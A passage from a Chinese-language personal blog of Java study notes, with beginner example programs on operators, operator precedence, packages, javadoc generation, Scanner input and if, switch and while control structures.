c=25;</span><br><span class="line">        int d=25;</span><br><span class="line">        System.out.println(a+b);</span><br><span class="line">        System.out.println(a-b);</span><br><span class="line">        System.out.println(a*b);</span><br><span class="line">        System.out.println(a/(double)b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">package operator;</span><br><span class="line"></span><br><span class="line">public class Demo02 &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line"></span><br><span class="line">        long a=123124151123L;</span><br><span class="line">        int b=123;</span><br><span class="line">        short c= 10;</span><br><span class="line">        byte d=8;</span><br><span class="line">        System.out.println(a+b+c+d);//long</span><br><span class="line">        System.out.println(b+c+d);//int</span><br><span class="line">        System.out.println(c+d);//int</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">package operator;</span><br><span class="line"></span><br><span class="line">public class Demo03 &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        //关系运算符返回的结果： 正确 错误  布尔值</span><br><span class="line">        int a=10;</span><br><span class="line">        int b=2;</span><br><span class="line">        int c=21;</span><br><span class="line">        System.out.println(c%a);</span><br><span class="line">        System.out.println(a&gt;b);</span><br><span class="line">        System.out.println(a&lt;b);</span><br><span class="line">        System.out.println(a==b);</span><br><span class="line">        System.out.println(a!=b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="自增运算符"><a href="#自增运算符" class="headerlink" title="自增运算符"></a>自增运算符</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> operator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.w3c.dom.ls.LSOutput;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo04</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//++  --   自增  自减  一元运算符</span></span><br><span class="line">    <span class="type">int</span> a=<span class="number">3</span>;</span><br><span class="line">    <span class="type">int</span> b=a++;<span class="comment">//执行完这行代码后，先给b赋值，在自增</span></span><br><span class="line">        <span class="comment">//a=a+1</span></span><br><span class="line">        System.out.println(a);</span><br><span class="line">    <span class="type">int</span> <span class="variable">c</span> <span class="operator">=</span>++a;<span class="comment">//执行这段代码，先自增，再给b赋值</span></span><br><span class="line">        System.out.println(a);</span><br><span class="line">        System.out.println(a);</span><br><span class="line">        System.out.println(b);</span><br><span class="line">        System.out.println(b);</span><br><span class="line">        System.out.println(c);</span><br><span class="line">        System.out.println(c);</span><br><span class="line">        <span class="comment">//幂运算  2^3  运用Math类工具</span></span><br><span class="line">        <span class="type">double</span> <span class="variable">pow</span> <span class="operator">=</span> Math.pow(<span class="number">2</span>,<span class="number">3</span>);</span><br><span class="line">        System.out.println(pow);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="位运算符"><a href="#位运算符" class="headerlink" title="位运算符"></a>位运算符</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> operator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo06</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        * A=0011 1100</span></span><br><span class="line"><span class="comment">        * B=0000 1101</span></span><br><span class="line"><span class="comment">        * A&amp;B=0000 1100</span></span><br><span class="line"><span class="comment">        * A|b=0011 1101</span></span><br><span class="line"><span class="comment">        * A^B=0011 0010</span></span><br><span class="line"><span class="comment">        * ~B=111 0010</span></span><br><span class="line"><span class="comment">        *2*8=16 2*2*2*2</span></span><br><span class="line"><span class="comment">        *&lt;&lt; *2   &gt;&gt; /2</span></span><br><span class="line"><span class="comment">        * 位运算  效率高！！！</span></span><br><span class="line"><span class="comment">        0000 0000  0</span></span><br><span class="line"><span class="comment">        0000 0001  1</span></span><br><span class="line"><span class="comment">        0000 0010  2</span></span><br><span class="line"><span class="comment">        0000 0100  4</span></span><br><span class="line"><span class="comment">        0000 1000  8</span></span><br><span class="line"><span class="comment">        0001 0000  16</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        * */</span></span><br><span class="line">        System.out.println(<span class="number">2</span>&lt;&lt;<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="三元运算符"><a href="#三元运算符" class="headerlink" title="三元运算符"></a>三元运算符</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> operator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo07</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> a=<span class="number">10</span>;</span><br><span class="line">        <span class="type">int</span> b=<span class="number">20</span>;</span><br><span class="line">        a+=b;<span class="comment">//a=a+b</span></span><br><span class="line">        a-=b;<span class="comment">//a=a-b</span></span><br><span class="line">        System.out.println(a);</span><br><span class="line">        <span class="comment">//字符串连接符 +  String</span></span><br><span class="line">        System.out.println(a+b);</span><br><span class="line">        System.out.println(<span class="string">&quot;&quot;</span>+a+b);</span><br><span class="line">        System.out.println(a+b+<span class="string">&quot;&quot;</span>);<span class="comment">//先运算加在和字符串相加</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> operator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo08</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//x?y:z</span></span><br><span class="line">        <span class="comment">//如果x==true ，则结果为y，否则结果为z</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">score</span> <span class="operator">=</span><span class="number">80</span>;</span><br><span class="line">        String type=score&lt;<span class="number">60</span>?<span class="string">&quot;不及格&quot;</span>:<span class="string">&quot;及格&quot;</span>;</span><br><span class="line">        System.out.println(type);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="运算优先级"><a href="#运算优先级" class="headerlink" title="运算优先级"></a>运算优先级</h4><table><thead><tr><th>类别</th><th>操作符</th><th>关联性</th></tr></thead><tbody><tr><td>后缀</td><td>() [] . (点操作符)</td><td>左到右</td></tr><tr><td>一元</td><td>expr++  expr–</td><td>从左到右</td></tr><tr><td>一元</td><td>++expr –expr + - ～ ！</td><td>从右到左</td></tr><tr><td>乘性</td><td>* &#x2F;％</td><td>左到右</td></tr><tr><td>加性</td><td>+ -</td><td>左到右</td></tr><tr><td>移位</td><td>&gt;&gt; &gt;&gt;&gt;  &lt;&lt;</td><td>左到右</td></tr><tr><td>关系</td><td>&gt;  &gt;&#x3D;  &lt;  &lt;&#x3D;</td><td>左到右</td></tr><tr><td>相等</td><td>&#x3D;&#x3D; !&#x3D;</td><td>左到右</td></tr><tr><td>按位与</td><td>＆</td><td>左到右</td></tr><tr><td>按位异或</td><td>^</td><td>左到右</td></tr><tr><td>按位或</td><td>|</td><td>左到右</td></tr><tr><td>逻辑与</td><td>&amp;&amp;</td><td>左到右</td></tr><tr><td>逻辑或</td><td>| |</td><td>左到右</td></tr><tr><td>条件</td><td>？：</td><td>从右到左</td></tr><tr><td>赋值</td><td>&#x3D; + &#x3D; - &#x3D; * &#x3D; &#x2F; &#x3D;％&#x3D; &gt;&gt; &#x3D; &lt;&lt; &#x3D;＆&#x3D; ^ &#x3D; | &#x3D;</td><td>从右到左</td></tr><tr><td>逗号</td><td>，</td><td>左到右</td></tr></tbody></table><h3 id="包机制"><a href="#包机制" class="headerlink" title="包机制"></a>包机制</h3><p>为了更好的组织类，java提供了包机制，用于区别类名的命名空间。</p><p>包语句的语法格式为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> pkg1[.pkg2[.pkg3...]];</span><br></pre></td></tr></table></figure><p>一班利用公司域名倒置作为包名；</p><p>为了能够使用某一个包的成员，我们需要在java程序中明确导入该包。使用“import”完成此功能</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="keyword">package</span>[.package2...].(ckassname|*);</span><br></pre></td></tr></table></figure><p>包就像文件夹一样</p><p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/image/image-20230822160255214-1698627034979-7-1700990364418-196-1700994560237-171.png"></p><h3 id="javaDoc"><a href="#javaDoc" class="headerlink" title="javaDoc"></a>javaDoc</h3><p>javaDoc命令是用来生成自己Api文档的</p><h4 id="命令行生成javadoc文档"><a href="#命令行生成javadoc文档" class="headerlink" title="命令行生成javadoc文档"></a>命令行生成javadoc文档</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javadoc -encoding UTF-<span class="number">8</span> -charset UTF-<span class="number">8</span> Demo.java</span><br></pre></td></tr></table></figure><p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/AAwangzhan\blog2\themes\butterfly\source\img\image-20230822164523717.png"></p><p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/AAwangzhan\blog2\themes\butterfly\source\img\image-20230822164535066.png"></p><p>点开index.html</p><p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/AAwangzhan\blog2\themes\butterfly\source\img\image-20230822164554989.png"></p><h4 id="IDEA生成javadoc文档"><a href="#IDEA生成javadoc文档" class="headerlink" title="IDEA生成javadoc文档"></a>IDEA生成javadoc文档</h4><p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/AAwangzhan\blog2\themes\butterfly\source\img\image-20230822192435394.png"></p><p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/AAwangzhan\blog2\themes\butterfly\source\img\image-20230822192453952.png"></p><p>第一步：选择生成JavaDoc文档的范围，我只对一个源文件生成Doc，所以选择文件。<br>第二步：输出目录最好新建一个文件夹，比较有条理和整洁<br>第三步：区域设置，决定文档的语言，简体中文就是zh_CN、繁体(台湾)zh_tw、繁体(香港)zh-hk、英语(香港)en-hk、英语(美国)en-us、英语(英国)en-gb、英语(全球)en-ww<br>第四步：其他命令行参数：如果区域设置为中国，参数一般为-encoding UTF-8 -charset UTF-8<br>第五步：设置完成后点击确定即可生成Doc文档</p><h2 id="Java流程控制"><a href="#Java流程控制" class="headerlink" title="Java流程控制"></a>Java流程控制</h2><p>###Scanner对象</p><p>基本语法</p><p>Scanner  s &#x3D;new Scanner（System.in)</p><p>通过Scanner 类的next（）与newxtLine()方法获取输入的字符串，在读取钱我们一般需要是hasNext()与NextLine（）判断是否还有输入的数据</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.qingchuan.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//创建一个扫描器对象，用于接受键盘数据</span></span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        System.out.println(<span class="string">&quot;使用next方式接收：&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//判断用户有没有输入字符串</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(scanner.hasNext())&#123;</span><br><span class="line">            <span class="comment">//使用next方式及接收</span></span><br><span class="line">             <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span>scanner.next();</span><br><span class="line">            System.out.println(<span class="string">&quot;输出的内容为：&quot;</span>+str);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//凡是输入IO流的类如果不关闭会一直占用资源，要养成良好的习惯用完就关闭</span></span><br><span class="line">        scanner.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="next-与-nextLine-区别"><a href="#next-与-nextLine-区别" class="headerlink" title="next() 与 nextLine() 区别"></a>next() 与 nextLine() 区别</h3><p>next():</p><ul><li>1、一定要读取到有效字符后才可以结束输入。</li><li>2、对输入有效字符之前遇到的空白，next() 方法会自动将其去掉。</li><li>3、只有输入有效字符后才将其后面输入的空白作为分隔符或者结束符。 </li><li>next() 不能得到带有空格的字符串。</li></ul><p>nextLine()： </p><ul><li>1、以Enter为结束符,也就是说 nextLine()方法返回的是输入回车之前的所有字符。 </li><li>2、可以获得空白。</li></ul><p>如果要输入 int 或 float 类型的数据，在 Scanner 类中也有支持，但是在输入之前最好先使用 hasNextXxx() 方法进行验证，再使用 nextXxx() 来读取：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.qingchuan.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo02</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//从键盘接收数据</span></span><br><span class="line">        Scanner scanner=<span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        System.out.println(<span class="string">&quot;使用next方式接收：&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (scanner.hasNext()) &#123;</span><br><span class="line">            <span class="comment">//判断是否还有输入</span></span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span>scanner.nextLine();</span><br><span class="line">            System.out.println(<span class="string">&quot;输入数据为：&quot;</span>+str);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        scanner.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.qingchuan.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo05</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//我们要输入多个数字，并求其总和和平均数，没输入一个数字回车确认，通过输入非数字来结束并输出结果</span></span><br><span class="line">    Scanner scanner=<span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">    <span class="type">double</span> sum=<span class="number">0</span>;</span><br><span class="line">    <span class="comment">//计算输入了多少个数字</span></span><br><span class="line">    <span class="type">int</span> m=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//通过循环判断是否还有输入，并在里面每一次进行求和和统计</span></span><br><span class="line">    <span class="keyword">while</span>(scanner.hasNextDouble()) &#123;</span><br><span class="line">        <span class="type">double</span> <span class="variable">x</span> <span class="operator">=</span> scanner.nextDouble();</span><br><span class="line">        m = m + <span class="number">1</span>;</span><br><span class="line">        sum = sum + x;</span><br><span class="line">        System.out.println(<span class="string">&quot;你输入了第&quot;</span>+m+<span class="string">&quot;个数据&quot;</span>+<span class="string">&quot;,然后当前数据是&quot;</span>+sum);</span><br><span class="line">    &#125;</span><br><span class="line">        System.out.println(m+<span class="string">&quot;个数的和为&quot;</span>+sum);</span><br><span class="line">        System.out.println(m+<span class="string">&quot;个数的平均值是&quot;</span>+(sum/m));</span><br><span class="line">    scanner.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="顺序结构"><a href="#顺序结构" class="headerlink" title="顺序结构"></a>顺序结构</h3><p>代码依次执行的结构</p><p>任何一种结构的基本结构</p><h3 id="if选择结构"><a href="#if选择结构" class="headerlink" title="if选择结构"></a>if选择结构</h3><p>语法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(布尔表达式)&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//如果布尔表达式成立会怎么样</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//如果布尔表达式为false</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(布尔表达式<span class="number">1</span>)&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//如果布尔表达式成立会怎么样</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (布尔表达式<span class="number">2</span>)&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//如果布尔表达式为false</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (布尔表达式<span class="number">3</span>)&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//如果布尔表达式为false</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/AAwangzhan\blog2\themes\butterfly\source\img\image-20230823092226066.png" alt="image-20230823092226066"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.qingchuan.struct;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IFDemo03</span>  &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">    System.out.println(<span class="string">&quot;请输入考试成绩：&quot;</span>);</span><br><span class="line">    <span class="type">int</span> sorce=scanner.nextInt();</span><br><span class="line">    <span class="keyword">if</span>(sorce==<span class="number">100</span>)&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;恭喜你，成绩满分！太棒了&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(sorce&lt;<span class="number">100</span>&amp;&amp;sorce&gt;<span class="number">90</span>)&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;！还不错呦&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(sorce&lt;<span class="number">90</span>&amp;&amp;sorce&gt;<span class="number">80</span>)&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;继续努力，你可以变得更好&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (sorce&lt;<span class="number">80</span>&amp;&amp;sorce&gt;<span class="number">70</span>) &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;有点落下了，快点跟上啊！！！！&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (sorce&lt;<span class="number">70</span>&amp;&amp;sorce&gt;<span class="number">60</span>) &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;不要灰心，相信你可以的！！&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>  &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;别学了，回家种地吧！！！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="if嵌套结构"><a href="#if嵌套结构" class="headerlink" title="if嵌套结构"></a>if嵌套结构</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if(布尔表达式)&#123;</span><br><span class="line"></span><br><span class="line">if(布尔表达式)&#123;</span><br><span class="line"></span><br><span class="line">&#125;&#125;</span><br></pre></td></tr></table></figure><p>####switch多选择结构</p><p>switch语句中变量类型可以是：</p><p>byte,short,int char</p><p>从javaSE7开始</p><p>switch支持String类型</p><p>同事case标签必须为字符串常量或字面量</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span>(expression)&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> value:</span><br><span class="line"></span><br><span class="line"><span class="comment">//语句</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span>:<span class="comment">//可选</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> value：</span><br><span class="line"></span><br><span class="line"><span class="comment">//语句</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="comment">//你可以有任意数量的case语句</span></span><br><span class="line"><span class="keyword">default</span>:<span class="comment">//可选</span></span><br><span class="line"><span class="comment">//语句</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>###循环结构</p><h4 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">while（布尔表达式）&#123;</span><br><span class="line"></span><br><span class="line">//循环内容</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只要布尔表达式为true，循环就会一直执行下去。<br>我们大多数情况是会让循环停止下来的，我们需要一个让表达式失效的方式来结束循环。少部分情况需要循环一直执行，比如服务器的请求响应监听等。<br>循环条件一直为true就会造成无限循环【死循环】，我们正常的业务编程中应该尽量避免死循环。会影响程序性能或者造成程序卡死奔溃!</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.qingchuan.struct;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WhilDemo01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//输出1-100</span></span><br><span class="line">         <span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line">   